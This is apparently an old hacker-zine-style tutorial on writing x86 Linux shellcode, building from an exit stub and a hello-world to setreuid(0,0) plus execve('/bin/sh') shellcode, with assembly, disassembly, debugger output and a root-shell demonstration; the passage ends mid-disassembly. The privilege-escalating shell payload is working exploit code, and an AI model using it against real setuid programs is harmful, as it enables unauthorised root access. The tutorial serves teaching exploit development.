@@ -1,0 +1,893 @@
+|=-------------------=[ Introduction to Writing Shellcode ]=------------------=|
+|=----------------------------------------------------------------------------=|
+|=-------------------------=[ lhall@telegenetic.net ]=------------------------=|
+
+
+----[ Introduction to writing shellcode.
+
+Shellcode is machine code that when executed spawns a shell, sometimes. 
+Shellcode cannot have any null's in it because it is (usually) treated as a C 
+string and a null will stop the reading of the string, as it is the string 
+delimiter. Not all "shellcode" spawns a shell, this has become a more generic 
+name for a bit of position independant machine readable code that can be directly 
+executed by the cpu. Shellcode must always be position independant - you cannot 
+access any values through static addresses, as these address will not be static 
+in the program that is executing your shellcode - environment variables are the 
+execption to this rule. Remember to always use the smallest part of a register
+possible to avoid null's, and xor is your friend.
+
+To test out the shellcode we will be using this C prog:
+
+char shellcode[] = "";             /* global array */
+int
+main (int argc, char **argv)
+{
+        int (*ret)();              /* ret is a function pointer */
+        ret = (int(*)())shellcode; /* ret points to our shellcode */
+                                   /* shellcode is type caste as a function */
+        (int)(*ret)();             /* execute, as a function, shellcode[] */
+        exit(0);                   /* exit() */
+}
+
+Start off with a simple one, just exit.
+
+entropy@phalaris {~/asm/shellcode} cat exit.s
+
+.globl _start
+_start:
+   xor %eax, %eax   # xor anything with itself is 0, so %eax = 0
+   movb $1, %al     # move byte 1 into al(a low), eax contains syscall number
+   xor %ebx, %ebx   # set ebx to 0, ebx contains return value
+   int $0x80        # call kernel
+
+Assemble.
+
+entropy@phalaris {~/asm/shellcode} as exit.s -o exit.o
+
+Link.
+
+entropy@phalaris {~/asm/shellcode} ld exit.o -o exit
+
+Disassemble.
+
+entropy@phalaris {~/asm/shellcode} objdump -d exit
+
+
+exit:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048094 <_start>:
+ 8048094:       31 c0                   xor    %eax,%eax
+ 8048096:       b0 01                   mov    $0x1,%al
+ 8048098:       31 db                   xor    %ebx,%ebx
+ 804809a:       cd 80                   int    $0x80
+
+ ^              ^                       ^
+ Address        Opcode / Machine Code   Assembly
+
+What we are concerned with here is the machine code, so lets make a string 
+out of it, it should look like this on my box:
+
+   "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
+
+And put that into out test code so it looks like:
+
+char shellcode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
+int
+main (int argc, char **argv)
+{
+        int (*ret)();              /* ret is a function pointer */
+        ret = (int(*)())shellcode; /* ret points to our shellcode */
+                                   /* shellcode is type casted as a function */
+        (int)(*ret)();             /* execute as function shellcode[] */
+        /*exit(0);*/                   /* exit() */
+}
+
+Notice that I commented out the exit(0); as the shellcode will be preforming that
+for us. Compile and run.
+
+entropy@phalaris {~/asm/shellcode} gcc exit_test.c -o exit_test
+
+entropy@phalaris {~/asm/shellcode} ./exit_test
+
+entropy@phalaris {~/asm/shellcode} echo $?
+0
+
+So it looks like it executed correctly but how to be sure? We can strace it to see 
+what syscall's it executing and look for exit or we can strp through it with gdb, 
+we'll try both.
+
+entropy@phalaris {~/asm/shellcode} strace ./exit_test
+
+execve("./exit_test", ["./exit_test"], [/* 44 vars */]) = 0
+brk(0)                                  = 0x804a000
+open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=59729, ...}) = 0
+old_mmap(NULL, 59729, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40016000
+close(3)                                = 0
+open("/lib/libc.so.6", O_RDONLY)        = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0PS\1\000"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1201120, ...}) = 0
+old_mmap(NULL, 1137860, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) 
+= 0x40025000
+mprotect(0x40134000, 27844, PROT_NONE)  = 0
+old_mmap(0x40135000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|
+MAP_DENYWRITE, 3, 
+0x10f000)
+= 0x40135000
+old_mmap(0x40139000, 7364, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|
+MAP_ANONYMOUS,-1, 0) =
+0x40139000
+close(3)                                = 0
+mprotect(0x40135000, 4096, PROT_READ)   = 0
+munmap(0x40016000, 59729)               = 0
+open("/dev/urandom", O_RDONLY)          = 3
+read(3, "}\30\374\7", 4)                = 4
+close(3)                                = 0
+_exit(0)                                = ?
+
+Here we can see the first syscall execve executing out program, followed by 
+the opening of the dynamic linker/loader ld.so (first preload then cache) to 
+load shared libraries, followed by the opening of libc, followed by its 
+idenitifcation as an ELF file ("\177ELF"), followed by our programing being 
+memory mapped, and finally our call to exit.
+
+And for gdb recompile with debugging symbols.
+
+entropy@phalaris {~/asm/shellcode} gcc -g exit_test.c -o exit_test
+
+entropy@phalaris {~/asm/shellcode} gdb exit_test
+
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-pc-linux-gnu"...Using host libthread_db library
+"/lib/libthread_db.so.1".
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x08048340 <main+0>:    push   %ebp
+0x08048341 <main+1>:    mov    %esp,%ebp
+0x08048343 <main+3>:    sub    $0x8,%esp
+0x08048346 <main+6>:    and    $0xfffffff0,%esp
+0x08048349 <main+9>:    mov    $0x0,%eax
+0x0804834e <main+14>:   sub    %eax,%esp
+0x08048350 <main+16>:   movl   $0x804955c,0xfffffffc(%ebp)
+0x08048357 <main+23>:   mov    0xfffffffc(%ebp),%eax
+0x0804835a <main+26>:   call   *%eax
+0x0804835c <main+28>:   leave
+0x0804835d <main+29>:   ret
+End of assembler dump.
+
+(gdb) disas shellcode
+Dump of assembler code for function shellcode:
+0x0804955c <shellcode+0>:       xor    %eax,%eax
+0x0804955e <shellcode+2>:       mov    $0x1,%al
+0x08049560 <shellcode+4>:       xor    %ebx,%ebx
+0x08049562 <shellcode+6>:       int    $0x80
+0x08049564 <shellcode+8>:       add    %al,(%eax)
+0x08049566 <shellcode+10>:      add    %al,(%eax)
+End of assembler dump.
+
+At line: <main+16>:   movl   $0x804955c,0xfffffffc(%ebp), the address of our 
+shellcode is being put into the local variable -4(%ebp) (remeber that local 
+variables are always subtracted from ebp and that 0xfffffffc = -4 in 2's 
+complement). Then on the next line <main+23>:   mov    0xfffffffc(%ebp),%eax, 
+that address is being put into %eax, and following <main+26>:   call   *%eax, 
+our shellcode is called to execute. If you look at the disassembly of shellcode 
+((gdb) disas shellcode) you will see that up until instruction <shellcode+6> that 
+is our assembly we had for exit, so you can be sure that it is executing exit().
+
+Now some shellcode to print a string, this is going to be more complex as now we 
+have to know the issues in creating our shellcode.
+
+1) You can not have nulls in your shellcode.
+2) You can not use static addresses in your shellcode.
+
+Ok so if we have a string, say its "Hello, World\n", in our shellcode and we 
+cannot use static addresses how can we possibly get the address of the string 
+to write? If you remember that what the instruction call does, call pushes the 
+next value following it (the return value normally) onto the stack then transfers 
+control to the symbol following call. So if we put the address of our string 
+directly after a call instruction, when call has transfered control to the symbol
+following it the address of our string will be on the top of the stack and we 
+can just pop it off. Thats what we'll do. Also remeber that anything xor'ed
+with itself is going to be 0 so its a good way to get something 0 without a 
+movl $0, %reg. Ok we are going to need a write, and an exit so lets get the 
+syscall number and the function definition of these.
+
+entropy@phalaris {~/asm/shellcode} man 2 write
+
+[...snip...]
+
+ssize_t write(int fd, const void *buf, size_t count);
+
+[...snip...]
+
+write() takes the file descriptor to write to (we'll use STDOUT 1), an address 
+of the string to write, and its length.
+
+entropy@phalaris {~/asm/shellcode} grep __NR_write /usr/include/asm/unistd.h
+#define __NR_write                4
+
+And the write() syscall number is 4, and for exit...
+
+entropy@phalaris {~/asm/shellcode} man 2 exit
+
+[...snip...]
+
+void _exit(int status);
+
+[...snip...]
+
+exit() just takes the exit status, we use 0 for no errors.
+
+entropy@phalaris {~/asm/shellcode} grep __NR_exit /usr/include/asm/unistd.h
+#define __NR_exit                 1
+
+And exit() syscall number is 1.
+
+Lets check out the assembly.
+
+entropy@phalaris {~/asm/shellcode} cat hello.s
+
+.globl _start
+_start:
+   jmp do_call    # 1. jump down and do a call to get the address
+jmp_back:         # 4. the call transfered control here
+   xor %eax, %eax # 5. set eax to 0
+   xor %ebx, %ebx # 6. set ebx to 0
+   xor %ecx, %ecx # 7. set ecx to 0
+   xor %edx, %edx # 8. set edx to 0
+   movb $4, %al   # 9. 4 is syscall number for write(int fd,char *str, int len)
+   movb $14, %dl  # 10. put 14 into dl(d low) its the string length
+   popl %ecx      # 11. pop the adrress off the stack, which is the string addr
+   movb $1, %bl   # 12. put 1 into bl(b low), its the fd to write to STDOUT
+   int $0x80      # 13. call the kernel
+   xor %eax, %eax # 14. set eax to 0
+   movb $1, %al   # 15. 1 is syscall number for exit
+   xor %ebx, %ebx # 16. set ebx to 0, its the return value
+   int $0x80      # 17. call kernel
+do_call:          # 2. about to execute the call, notice hello: symbol following
+   call jmp_back  # 3. now we have the address of hello on the stack jmp_back
+hello:
+   .ascii "Hello, World!\n"
+
+So assemble, link and disassemble it.
+
+entropy@phalaris {~/asm/shellcode} as hello.s -o hello.o
+
+entropy@phalaris {~/asm/shellcode} ld hello.o -o hello
+
+entropy@phalaris {~/asm/shellcode} objdump -d hello
+
+hello:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048094 <_start>:
+ 8048094:       eb 19                   jmp    80480af <do_call>
+
+08048096 <jmp_back>:
+ 8048096:       31 c0                   xor    %eax,%eax
+ 8048098:       31 db                   xor    %ebx,%ebx
+ 804809a:       31 c9                   xor    %ecx,%ecx
+ 804809c:       31 d2                   xor    %edx,%edx
+ 804809e:       b0 04                   mov    $0x4,%al
+ 80480a0:       b2 0e                   mov    $0xe,%dl
+ 80480a2:       59                      pop    %ecx
+ 80480a3:       b3 01                   mov    $0x1,%bl
+ 80480a5:       cd 80                   int    $0x80
+ 80480a7:       31 c0                   xor    %eax,%eax
+ 80480a9:       b0 01                   mov    $0x1,%al
+ 80480ab:       31 db                   xor    %ebx,%ebx
+ 80480ad:       cd 80                   int    $0x80
+
+080480af <do_call>:
+ 80480af:       e8 e2 ff ff ff          call   8048096 <jmp_back>
+
+080480b4 <hello>:
+ 80480b4:       48                      dec    %eax
+ 80480b5:       65                      gs
+ 80480b6:       6c                      insb   (%dx),%es:(%edi)
+ 80480b7:       6c                      insb   (%dx),%es:(%edi)
+ 80480b8:       6f                      outsl  %ds:(%esi),(%dx)
+ 80480b9:       2c 20                   sub    $0x20,%al
+ 80480bb:       57                      push   %edi
+ 80480bc:       6f                      outsl  %ds:(%esi),(%dx)
+ 80480bd:       72 6c                   jb     804812b <hello+0x77>
+ 80480bf:       64 21 0a                and    %ecx,%fs:(%edx)
+
+The assembly is all pretty understandable until you get down to the <hello>
+symbol, but if you take a look at an extended ascii chart it will be much clearer. 
+48 hex is, if you notice, a capital 'H', 65 hex is and 'e', 6c is an 'l' .... 
+these hex chars are also machine code, they are just being interpereted differently. 
+For example '31' can be interperted many different ways depending on how the 
+programmer is representing it, if printing it out so as to represent it as a 
+printable character as in printf("%c\n", 0x31); it print's '1' because as you 
+can see the char '1' in hex according to the ascii chart is 31. If it is an 
+opcode as in our disassembly above  "31 c0                   xor    %eax,%eax" 
+31 is the machine code for the instruction 'xor'. Its important to rememeber this. 
+So the assembly following the <hello> symbol is really:
+
+H  e  l  l  o  ,     W  o  r  l  d  !  \n
+48 65 6c 6c 6f 2c 20 57 6f 72 6c 64 21 0a
+
+Create the shellcode string from the disassembly, I have:
+
+eb 19 31 c0 31 db 31 c9 31 d2 b0 04 b2 0e 59 b3 01
+cd 80 31 c0 b0 01 31 db cd 80 e8 e2 ff ff ff 48 65
+6c 6c 6f 2c 20 57 6f 72 6c 64 21 0a
+
+And make a C string out of it, hex chars need a '\x' in front of them:
+
+"\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb2\x0e\x59\xb3\x01
+\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65
+\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a"
+
+Put it in a test file, compile and run it.
+
+entropy@phalaris {~/asm/shellcode} cat hello_test.c
+char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04"\
+                   "\xb2\x0e\x59\xb3\x01\xcd\x80\x31\xc0\xb0\x01\x31"\
+                   "\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c"\
+                   "\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a";
+int
+main (int argc, char **argv)
+{
+        int (*ret)();              /* ret is a function pointer */
+        ret = (int(*)())shellcode; /* ret points to our shellcode */
+                                   /* shellcode is type casted as a function */
+        (int)(*ret)();             /* execute as function shellcode[] */
+        exit(0);                   /* exit() */
+}
+
+entropy@phalaris {~/asm/shellcode} gcc -g hello_test.c -o hello_test
+entropy@phalaris {~/asm/shellcode} ./hello_test
+Hello, World!
+
+entropy@phalaris {~/asm/shellcode} strace ./hello_test
+
+[...snip...]
+
+write(1, "Hello, World!\n", 14Hello, World!
+)         = 14
+
+[...snip...]
+
+You can see the write syscall, and take a look at the disassembly in gdb.
+
+entropy@phalaris {~/asm/shellcode} gdb hello_test
+
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-pc-linux-gnu"...Using host libthread_db library
+"/lib/libthread_db.so.1".
+
+(gdb) disas shellcode
+Dump of assembler code for function shellcode:
+0x080495c0 <shellcode+0>:       jmp    0x80495db <shellcode+27>
+0x080495c2 <shellcode+2>:       xor    %eax,%eax
+0x080495c4 <shellcode+4>:       xor    %ebx,%ebx
+0x080495c6 <shellcode+6>:       xor    %ecx,%ecx
+0x080495c8 <shellcode+8>:       xor    %edx,%edx
+0x080495ca <shellcode+10>:      mov    $0x4,%al
+0x080495cc <shellcode+12>:      mov    $0xe,%dl
+0x080495ce <shellcode+14>:      pop    %ecx
+0x080495cf <shellcode+15>:      mov    $0x1,%bl
+0x080495d1 <shellcode+17>:      int    $0x80
+0x080495d3 <shellcode+19>:      xor    %eax,%eax
+0x080495d5 <shellcode+21>:      mov    $0x1,%al
+0x080495d7 <shellcode+23>:      xor    %ebx,%ebx
+0x080495d9 <shellcode+25>:      int    $0x80
+0x080495db <shellcode+27>:      call   0x80495c2 <shellcode+2>
+0x080495e0 <shellcode+32>:      dec    %eax
+0x080495e1 <shellcode+33>:      gs
+0x080495e2 <shellcode+34>:      insb   (%dx),%es:(%edi)
+0x080495e3 <shellcode+35>:      insb   (%dx),%es:(%edi)
+0x080495e4 <shellcode+36>:      outsl  %ds:(%esi),(%dx)
+0x080495e5 <shellcode+37>:      sub    $0x20,%al
+0x080495e7 <shellcode+39>:      push   %edi
+0x080495e8 <shellcode+40>:      outsl  %ds:(%esi),(%dx)
+0x080495e9 <shellcode+41>:      jb     0x8049657
+0x080495eb <shellcode+43>:      and    %ecx,%fs:(%edx)
+0x080495ee <shellcode+46>:      add    %al,(%eax)
+End of assembler dump.
+
+Here again we can see our jump to the call "jmp    0x80495db <shellcode+27>", 
+and call pushes the next address which is 0x080495e0 (the start of our string) 
+and jumps back to address 0x80495c2 which is "<shellcode+2>:  xor    %eax,%eax", 
+and we now have the address we want on the top of the stack.
+
+So how about some real shellcode. First were goign to have to call setreuid() 
+it 0 incase the program we are exploiting drops privs. Next we are going to 
+have to call execve() to execute the shell namely /bin/sh. Again we need the 
+syscall number and function parameters to both of these functions.
+
+entropy@phalaris {~/asm/shellcode} man 2 setreuid
+
+[...snip...]
+
+int setreuid(uid_t ruid, uid_t euid);
+
+[...snip...]
+
+entropy@phalaris {~/asm/shellcode} grep __NR_setreuid /usr/include/asm/unistd.h
+#define __NR_setreuid            70
+
+Well this one is simple enough, just something like
+
+   xor %eax, %eax  # clear out eax
+   movb $70, %al   # mov 70 int al
+   xor %ecx, %ecx  # set ecx to 0, which is the uid_t euid (effective userid)
+   xor %ebx, %ebx  # set ebx to 0, which is the uid_t ruid (real userid)
+   int $0x80       # call kernel
+
+That ones easy. Now for execve.
+
+entropy@phalaris {~/asm/shellcode} man 2 execve
+
+[...snip...]
+
+int execve(const char *filename, char *const argv [], char *const envp[]);
+
+[...snip...]
+
+Fun times, two char ** arguments.
+
+entropy@phalaris {~/asm/shellcode} grep __NR_execv* /usr/include/asm/unistd.h
+#define __NR_execve              11
+
+Ok this ones a little harder. So were going to need a null terminated string, 
+the address of the string and a * null pointer in adjacent memory, that should 
+look something like:
+
+   execve("/bin/sh", *"/bin/sh", (char **)NULL);
+
+And in memory /bin/shNXXXXYYYY where /bin/sh is our null terminated string 
+(we must replace N with '\0'), XXXX (4 bytes) is the address of the address 
+of our string, and YYYY (4 bytes) is the address of the envp[] pointer( which we are 
+goign to call with *NULL). When we are all set to go %eax should have 11 in it, %ebx 
+should have the string address in it, %ecx should have the address of %ebx in it 
+and %edx should have the address of the (char **)NULL string in it.
+
+So lets code this, I ended up with this:
+
+.globl _start
+_start:
+   # our setreuid(0,0) call
+   xor %eax, %eax    # clear out eax
+   movb $70, %al     # mov 70 int al
+   xor %ecx, %ecx    # set ecx to 0, which is the uid_t euid (effective userid)
+   xor %ebx, %ebx    # set ebx to 0, which is the uid_t ruid (real userid)
+   int $0x80         # call kernel
+   # go get the address with the call trick
+   jmp do_call
+jmp_back:
+   pop %ebx            # ebx has the address of our string, use it to index
+   xor %eax, %eax      # set eax to 0
+   movb %al, 7(%ebx)   # put a null at the N aka shell[7]
+   movl %ebx, 8(%ebx)  # put the address of our string (in ebx) into shell[8]
+   movl %eax, 12(%ebx) # put the null at shell[12]
+   # our string now looks like "/bin/sh\0(*ebx)(*0000)" which is what we want.
+   xor %eax, %eax      # clear out eax
+   movb $11, %al       # put 11 which is execve syscall number into al
+   leal 8(%ebx), %ecx  # put the address of XXXX aka (*ebx) into ecx
+   leal 12(%ebx), %edx # put the address of YYYY aka (*0000) into edx
+   int $0x80           # call kernel
+do_call:
+   call jmp_back
+shell:
+   .ascii "/bin/shNXXXXYYYY"
+
+entropy@phalaris {~/asm/shellcode} as shell.s -o shell.o
+
+entropy@phalaris {~/asm/shellcode} ld shell.o -o shell
+
+entropy@phalaris {~/asm/shellcode} ./shell
+Segmentation fault
+
+Thats odd, the code looks to be correct? Lets step through it, in order to 
+break at _start with gdb we have to temporarily put a nop after the _start: 
+label and assemble with -g.
+
+entropy@phalaris {~/asm/shellcode} cat shell.s
+
+.globl _start
+_start:
+   # our setreuid(0,0) call
+   nop
+   xor %eax, %eax    # clear out eax
+   movb $70, %al     # mov 70 int al
+   xor %ecx, %ecx    # set ecx to 0, which is the uid_t euid (effective userid)
+   xor %ebx, %ebx    # set ebx to 0, which is the uid_t ruid (real userid)
+   int $0x80         # call kernel
+   # go get the address with the call trick
+   jmp do_call
+jmp_back:
+   pop %ebx            # ebx has the address of our string, use it to index
+   xor %eax, %eax      # set eax to 0
+   movb %al, 7(%ebx)   # put a null at the N aka shell[7]
+   movl %ebx, 8(%ebx)  # put the address of our string (in ebx) into shell[8]
+   movl %eax, 12(%ebx) # put the null at shell[12]
+   # our string now looks like "/bin/sh\0(*ebx)(*0000)" which is what we want.
+   xor %eax, %eax      # clear out eax
+   movb $11, %al       # put 11 which is execve syscall number into al
+   leal 8(%ebx), %ecx  # put the address of XXXX aka (*ebx) into ecx
+   leal 12(%ebx), %edx # put the address of YYYY aka (*0000) into edx
+   int $0x80           # call kernel
+do_call:
+   call jmp_back
+shell:
+   .ascii "/bin/shNXXXXYYYY"
+
+entropy@phalaris {~/asm/shellcode} as -g shell.s -o shell.o
+
+entropy@phalaris {~/asm/shellcode} ld shell.o -o shell
+
+entropy@phalaris {~/asm/shellcode} gdb shell
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-pc-linux-gnu"...Using host libthread_db library
+"/lib/libthread_db.so.1".
+
+(gdb) break *_start+1
+Breakpoint 1 at 0x8048095: file shell.s, line 5.
+(gdb) r
+Starting program: /home/entropy/asm/shellcode/shell
+
+Breakpoint 1, _start () at shell.s:5
+5          xor %eax, %eax    # clear out eax
+Current language:  auto; currently asm
+(gdb) s
+_start () at shell.s:6
+6          movb $70, %al     # mov 70 int al
+(gdb) s
+_start () at shell.s:7
+7          xor %ecx, %ecx    # set ecx to 0, which is the uid_t euid 
+(gdb) s
+_start () at shell.s:8
+8          xor %ebx, %ebx    # set ebx to 0, which is the uid_t ruid 
+(gdb) s
+_start () at shell.s:9
+9          int $0x80         # call kernel
+(gdb) s
+_start () at shell.s:11
+11         jmp do_call
+(gdb) s
+do_call () at shell.s:25
+25         call jmp_back
+(gdb) s
+jmp_back () at shell.s:13
+13         pop %ebx            # ebx has the address of our string
+(gdb) s
+jmp_back () at shell.s:14
+14         xor %eax, %eax      # set eax to 0
+(gdb) s
+jmp_back () at shell.s:15
+15         movb %al, 7(%ebx)   # put a null at the N aka shell[7]
+(gdb) s
+
+Program received signal SIGSEGV, Segmentation fault.
+jmp_back () at shell.s:15
+15         movb %al, 7(%ebx)   # put a null at the N aka shell[7]
+(gdb)
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+(gdb) quit
+
+entropy@phalaris {~/asm/shellcode}
+
+Ok thats odd were not allowed to write to our string? Why is that?
+Lets check out our sections:
+
+entropy@phalaris {~/asm/shellcode} objdump -x shell
+
+shell:     file format elf32-i386
+shell
+architecture: i386, flags 0x00000112:
+EXEC_P, HAS_SYMS, D_PAGED
+start address 0x08048094
+
+Program Header:
+    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
+         filesz 0x000000ce memsz 0x000000ce flags r-x
+    LOAD off    0x000000d0 vaddr 0x080490d0 paddr 0x080490d0 align 2**12
+         filesz 0x00000000 memsz 0x00000000 flags rw-
+PAX_FLAGS off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
+         filesz 0x00000000 memsz 0x00000000 flags --- 2800
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .text         0000003a  08048094  08048094  00000094  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+  1 .data         00000000  080490d0  080490d0  000000d0  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+  2 .bss          00000000  080490d0  080490d0  000000d0  2**2
+                  ALLOC
+  3 .debug_aranges 00000020  00000000  00000000  000000d0  2**3
+                  CONTENTS, READONLY, DEBUGGING
+  4 .debug_info   00000051  00000000  00000000  000000f0  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  5 .debug_abbrev 00000014  00000000  00000000  00000141  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  6 .debug_line   00000043  00000000  00000000  00000155  2**0
+                  CONTENTS, READONLY, DEBUGGING
+
+SYMBOL TABLE:
+08048094 l    d  .text  00000000
+080490d0 l    d  .data  00000000
+080490d0 l    d  .bss   00000000
+00000000 l    d  .debug_aranges 00000000
+00000000 l    d  .debug_info    00000000
+00000000 l    d  .debug_abbrev  00000000
+00000000 l    d  .debug_line    00000000
+00000000 l    d  *ABS*  00000000
+00000000 l    d  *ABS*  00000000
+00000000 l    d  *ABS*  00000000
+080480b9 l       .text  00000000 do_call
+080480a1 l       .text  00000000 jmp_back
+080480be l       .text  00000000 shell
+08048094 g       .text  00000000 _start
+080490d0 g       *ABS*  00000000 __bss_start
+080490d0 g       *ABS*  00000000 _edata
+080490d0 g       *ABS*  00000000 _end
+
+Here is the problem our shell string is in the .text or code section that is 
+marked read only, as seen above:
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .text         0000003a  08048094  08048094  00000094  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+
+Lets make our entire program in the .data section.
+
+entropy@phalaris {~/asm/shellcode} cat shell.s
+.section .data
+.globl _start
+_start:
+   # our setreuid(0,0) call
+   xor %eax, %eax    # clear out eax
+   movb $70, %al     # mov 70 int al
+   xor %ecx, %ecx    # set ecx to 0, which is the uid_t euid (effective userid)
+   xor %ebx, %ebx    # set ebx to 0, which is the uid_t ruid (real userid)
+   int $0x80         # call kernel
+   # go get the address with the call trick
+   jmp do_call
+jmp_back:
+   pop %ebx            # ebx has the address of our string, use it to index
+   xor %eax, %eax      # set eax to 0
+   movb %al, 7(%ebx)   # put a null at the N aka shell[7]
+   movl %ebx, 8(%ebx)  # put the address of our string (in ebx) into shell[8]
+   movl %eax, 12(%ebx) # put the null at shell[12]
+   # our string now looks like "/bin/sh\0(*ebx)(*0000)" which is what we want.
+   xor %eax, %eax      # clear out eax
+   movb $11, %al       # put 11 which is execve syscall number into al
+   leal 8(%ebx), %ecx  # put the address of XXXX aka (*ebx) into ecx
+   leal 12(%ebx), %edx # put the address of YYYY aka (*0000) into edx
+   int $0x80           # call kernel
+do_call:
+   call jmp_back
+shell:
+   .ascii "/bin/shNXXXXYYYY"
+
+entropy@phalaris {~/asm/shellcode} as -g shell.s -o shell.o
+
+entropy@phalaris {~/asm/shellcode} ld shell.o -o shell
+
+entropy@phalaris {~/asm/shellcode} objdump -x shell
+
+shell:     file format elf32-i386
+shell
+architecture: i386, flags 0x00000112:
+EXEC_P, HAS_SYMS, D_PAGED
+start address 0x08049094
+
+Program Header:
+    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
+         filesz 0x00000094 memsz 0x00000094 flags r-x
+    LOAD off    0x00000094 vaddr 0x08049094 paddr 0x08049094 align 2**12
+         filesz 0x00000039 memsz 0x0000003c flags rw-
+PAX_FLAGS off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
+         filesz 0x00000000 memsz 0x00000000 flags --- 2800
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .text         00000000  08048094  08048094  00000094  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+  1 .data         00000039  08049094  08049094  00000094  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+  2 .bss          00000000  080490d0  080490d0  000000cd  2**2
+                  ALLOC
+  3 .debug_aranges 00000020  00000000  00000000  000000d0  2**3
+                  CONTENTS, READONLY, DEBUGGING
+  4 .debug_info   00000051  00000000  00000000  000000f0  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  5 .debug_abbrev 00000014  00000000  00000000  00000141  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  6 .debug_line   00000042  00000000  00000000  00000155  2**0
+                  CONTENTS, READONLY, DEBUGGING
+
+
+SYMBOL TABLE:
+08048094 l    d  .text  00000000
+08049094 l    d  .data  00000000
+080490d0 l    d  .bss   00000000
+00000000 l    d  .debug_aranges 00000000
+00000000 l    d  .debug_info    00000000
+00000000 l    d  .debug_abbrev  00000000
+00000000 l    d  .debug_line    00000000
+00000000 l    d  *ABS*  00000000
+00000000 l    d  *ABS*  00000000
+00000000 l    d  *ABS*  00000000
+080490b8 l       .data  00000000 do_call
+080490a0 l       .data  00000000 jmp_back
+080490bd l       .data  00000000 shell
+08049094 g       .data  00000000 _start
+080490cd g       *ABS*  00000000 __bss_start
+080490cd g       *ABS*  00000000 _edata
+080490d0 g       *ABS*  00000000 _end
+
+Ok much better now our shell string is in the data section
+   080490bd l       .data  00000000 shell
+
+The .data section is not marked read only.
+
+1 .data         00000039  08049094  08049094  00000094  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+
+And try out he shell.
+
+entropy@phalaris {~/asm/shellcode} ./shell
+
+sh-2.05b$ exit
+exit
+
+So that works, now that we have all our code in the .data section to get 
+our machine code we need to use the -D. First reassemble and link without 
+debugging info.
+
+entropy@phalaris {~/asm/shellcode} as shell.s -o shell.o
+
+entropy@phalaris {~/asm/shellcode} ld shell.o -o shell
+
+chown and u+s it to make sure it wont drop privs.
+
+entropy@phalaris {~/asm/shellcode} sudo chown root shell
+
+entropy@phalaris {~/asm/shellcode} sudo chmod 4750 shell
+
+entropy@phalaris {~/asm/shellcode} ls -la shell
+-rwsr-x---  1 root users 811 Sep  4 13:16 shell
+
+entropy@phalaris {~/asm/shellcode} ./shell
+sh-2.05b# id
+uid=0(root) gid=100(users) groups=6(disk),10(wheel),18(audio),100(users)
+sh-2.05b#
+
+Looks good, disassemble.
+
+entropy@phalaris {~/asm/shellcode} rm shell
+rm: remove write-protected regular file `shell'? y
+
+entropy@phalaris {~/asm/shellcode} as shell.s -o shell.o
+
+entropy@phalaris {~/asm/shellcode} ld shell.o -o shell
+
+entropy@phalaris {~/asm/shellcode} objdump -D shell
+
+shell:     file format elf32-i386
+
+Disassembly of section .data:
+08049094 <_start>:
+ 8049094:       31 c0                   xor    %eax,%eax
+ 8049096:       b0 46                   mov    $0x46,%al
+ 8049098:       31 c9                   xor    %ecx,%ecx
+ 804909a:       31 db                   xor    %ebx,%ebx
+ 804909c:       cd 80                   int    $0x80
+ 804909e:       eb 18                   jmp    80490b8 <do_call>
+
+080490a0 <jmp_back>:
+ 80490a0:       5b                      pop    %ebx
+ 80490a1:       31 c0                   xor    %eax,%eax
